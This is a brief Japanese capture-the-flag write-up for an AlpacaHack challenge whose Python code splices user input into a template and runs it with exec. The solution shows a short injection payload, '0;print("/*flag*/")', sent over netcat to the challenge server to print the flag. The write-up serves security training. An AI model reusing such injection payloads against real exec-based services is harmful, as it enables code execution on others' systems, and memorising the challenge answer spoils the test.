# magic number

## 問題

https://alpacahack.com/daily/challenges/magic-number

```
import os

code = """
magic = /*code*/
if magic == 2508766360454420426020902195377847924746:
    print("/*flag*/")
else:
    print("bye")
"""

print("Show me your magic 🪄 ")
payload = input()
if len(payload) > 20:
    print("too long")
    exit(1)

compiled = code.replace("/*code*/", payload).replace("/*flag*/", os.environ.get("FLAG", "DUMMY_FLAG"))

exec(compiled, {"__builtins__": {"print": print}}, {})
```
## 解法

printのみ実行できるという意味。
```
exec(compiled, {"__builtins__": {"print": print}}, {})
```

```
nc 34.170.146.252 26003
Show me your magic 🪄
0;print("/*flag*/")
Alpaca{d0n7_m4k3_5uch_4_5111y_m1574k3}
```
